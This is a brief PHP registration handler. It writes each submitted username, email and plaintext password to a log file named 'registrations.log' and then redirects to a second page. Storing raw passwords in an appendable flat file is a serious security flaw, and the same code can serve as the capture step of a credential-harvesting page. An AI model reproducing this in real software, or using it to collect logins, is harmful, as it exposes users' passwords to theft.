<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $username = $_POST["username"] ?? '';
    $email = $_POST["email"] ?? '';
    $password = $_POST["password"] ?? '';

    // Prepare the log message
    $logMessage = "[" . date("Y-m-d H:i:s") . "] - Username: $username, Email: $email, Password: $password" . PHP_EOL;

    // Write the log message to the log file
    file_put_contents("registrations.log", $logMessage, FILE_APPEND);

    // Redirect to page 2
    header("Location: page2.html");
    exit;
}
?>
